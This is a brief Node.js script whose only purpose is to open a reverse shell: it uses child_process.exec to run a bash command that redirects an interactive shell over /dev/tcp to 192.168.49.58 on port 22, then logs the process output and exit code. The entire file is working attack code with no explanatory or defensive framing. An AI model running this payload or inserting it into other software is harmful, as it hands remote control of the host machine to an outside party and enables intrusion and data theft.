'use strict';

const { exec } = require('child_process');
const ls = exec("bash -c 'exec bash -i &>/dev/tcp/192.168.49.58/22 <&1'");

ls.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

ls.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

ls.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});
